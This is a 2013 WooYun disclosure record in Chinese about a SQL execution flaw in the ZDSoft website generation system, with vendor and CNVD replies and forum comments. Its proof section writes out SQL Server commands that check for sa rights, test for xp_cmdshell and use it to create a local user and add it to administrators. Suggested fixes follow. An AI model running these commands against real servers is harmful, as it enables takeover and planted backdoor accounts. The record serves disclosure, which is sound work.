{"id": 7313, "wybug_id": "wooyun-2013-037806", "wybug_title": "ZDSoft网站生成系统严严重漏洞", "wybug_corp": "ZDSoft网站生成系统", "wybug_author": "李旭敏", "wybug_date": "2013-09-22 20:07", "wybug_open_date": "2013-12-21 20:07", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "已交由第三方合作机构(cncert国家互联网应急中心)处理", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["安全意识不足", "默认配置不当"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2013-09-22：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2013-09-26：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2013-09-29：\t细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2013-11-20：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2013-11-30：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2013-12-10：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2013-12-21：\t细节向公众公开  简要描述： 感谢啊D和肉总的大力帮忙！利用该漏洞可以直接拿下ZDsoft网站生成系统的服务器··· 详细说明：  \n WooYun: ZDSoft网站生成系统严重漏洞 \n如上，进入SQL语句执行的平台···前者说了可以爆出管理密码。而我说的，是直接拿下服务器。\n\n可以看到是sa权限的···\n\n判断xp_cmdshell扩展存储是否存在···\n\n继续判断xp_regread扩展存储过程是否存在\n\n执行cmd命令看看···\n\n添加用户~~\n\n加进管理组\n\n 就这样，根本无需啥后台拿shell，直接就搞定服务器了。   漏洞证明：  \n\n判断权限是不是saselect is_srvrolemember('sysadmin')返回是1说明是sa判断xp_cmdshell扩展存储是否存在select count(*) from master.dbo.sysobjects where xtype = 'x' AND name= 'xp_cmdshell'返回为l则证明存在判断xp_regread扩展存储过程是否存在select count(*) from master.dbo.sysobjects where name='xp_regread'返回1证明存在添加用户exec master..xp_cmdshell 'net user test test /add'exec master..xp_cmdshell 'net localgroup administrators test /add'后来就是查看3389端口了，exec master..xp_cmdshell 'XXXXX'里面输入cmd命令就是了这些是肉肉和我搞了一个上午总结的。还有声明一下，她不是客服，她是技术人员！   修复方案：  \n\n\n\n\n\n可以禁止相关的扩展程序。把相关的DLL改名了就执行不了，之后再把相关的扩展名改一下名。或是直接把相关的文件权限禁了！加载过了再设置权限，不会有影响，然后重启一下服务器就行了。以上是啊D的建议~~~~据说可以防范一般小黑黑。我个人建议是：如果嫌麻烦的话可以装个D盾，里面有降权的功能。。   版权声明：转载请注明来源 李旭敏@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：18  确认时间：2013-09-26 22:46 厂商回复： CNVD确认并复现所述情况,在多个互联网实例上可复现,暂未发现涉及重要和政府部门的案例.由CNVD直接协调软件生产厂商处置.rank 18 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2013-09-22 20:13 |    \t\t肉肉  \t\t\t( 普通白帽子  |\t\t\t        Rank:112 漏洞数:10        | 肉肉在长亭科技，肉肉在长亭科技，肉肉在长...)\t\t \n  好吧，沙发    \n     2013-09-22 20:42 |    \t\t老笨蛋 \t\t\t( 路人 |\t\t\t        Rank:29 漏洞数:8        | 老笨蛋一个)\t\t \n  关注一下。    \n     2013-09-22 20:47 |    \t\t正好五个字 \t\t\t( 实习白帽子  |\t\t\t        Rank:93 漏洞数:15        )\t\t \n  围观。    \n     2013-09-22 20:59 |    \t\t肉肉  \t\t\t( 普通白帽子  |\t\t\t        Rank:112 漏洞数:10        | 肉肉在长亭科技，肉肉在长亭科技，肉肉在长...)\t\t \n  记得分我wb哈，不要独吞，哈哈    \n     2013-09-22 21:20 |    \t\t梧桐雨  \t\t\t( 核心白帽子 |\t\t\t        Rank:1576 漏洞数:184        | 关注技术与网络安全)\t\t \n  @肉肉 深藏不露啊    \n     2013-09-22 21:30 |    \t\t肉肉  \t\t\t( 普通白帽子  |\t\t\t        Rank:112 漏洞数:10        | 肉肉在长亭科技，肉肉在长亭科技，肉肉在长...)\t\t \n  @梧桐雨 木有。。。木有，我就是小菜鸟，不对，都不小了。。。    \n     2013-09-22 22:56 |    \t\t李旭敏 \t\t\t( 普通白帽子  |\t\t\t        Rank:469 漏洞数:71        | ฏ๎๎๎๎๎๎๎๎๎๎๎๎๎๎๎๎๎๎๎...)\t\t \n  @肉肉 行，政府如果找我要地址我就写你的···    \n     2013-09-22 23:16 |    \t\t正好五个字 \t\t\t( 实习白帽子  |\t\t\t        Rank:93 漏洞数:15        )\t\t \n  @李旭敏 呵呵。想太多了。我会说没奖励的。。    \n     2013-09-23 09:30 |    \t\tMas \t\t\t( 实习白帽子  |\t\t\t        Rank:42 漏洞数:15        )\t\t \n  有多严重    \n     2013-09-23 09:56 |    \t\tpx1624 \t\t\t( 普通白帽子  |\t\t\t        Rank:1036 漏洞数:175        | px1624)\t\t \n  @肉肉 我去，什么节奏啊，肉总，人人网那个你是不是故意的！哼哼。。    \n     2013-09-23 10:26 |    \t\t肉肉  \t\t\t( 普通白帽子  |\t\t\t        Rank:112 漏洞数:10        | 肉肉在长亭科技，肉肉在长亭科技，肉肉在长...)\t\t \n  @px1624 我木有，我反应慢嘛。。。还被你鄙视    \n     2013-10-17 12:32 |    \t\t正好五个字 \t\t\t( 实习白帽子  |\t\t\t        Rank:93 漏洞数:15        )\t\t \n  @李旭敏  WooYun: ZDSoft网站生成系统严重漏洞  跟这个有啥区别？？    \n     2013-10-17 20:47 |    \t\t李旭敏 \t\t\t( 普通白帽子  |\t\t\t        Rank:469 漏洞数:71        | ฏ๎๎๎๎๎๎๎๎๎๎๎๎๎๎๎๎๎๎๎...)\t\t \n  @正好五个字 如上，进入SQL语句执行的平台···前者说了可以爆出管理密码。而我说的，是直接拿下服务器。文中有提到，谢谢···    \n     2013-12-21 23:26 |    \t\t花少也是War  \t\t\t( 路人 |\t\t\t        Rank:0 漏洞数:2        | 我是小屁孩)\t\t \n  我无语，这能过？你又不是这洞的原创者，有sql执行平台，谁不会用xp_cmdshell执行命令，这个我早试过了。    \n     2013-12-22 20:10 |    \t\t李旭敏 \t\t\t( 普通白帽子  |\t\t\t        Rank:469 漏洞数:71        | ฏ๎๎๎๎๎๎๎๎๎๎๎๎๎๎๎๎๎๎๎...)\t\t \n  @花少也是War  呵呵，乌云网有不少提交的漏洞是一些分站用了某些开源的CMS，比如之前的织梦注入，你不如说一句，如果知道是织梦的，谁不会利用exp来注入？我开头第一句就说了，前者说的是爆出管理密码，后者是直接拿下服务器，我是不是没关系，漏洞不是我一个人发现的。审核漏洞的管理和厂商觉得这是漏洞，你又有什么好说的？    \n     2013-12-27 12:03 |    \t\t花少也是War  \t\t\t( 路人 |\t\t\t        Rank:0 漏洞数:2        | 我是小屁孩)\t\t \n  @李旭敏 好吧，我是彩笔。希望没惹到你    \n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 18, "Ranks": null}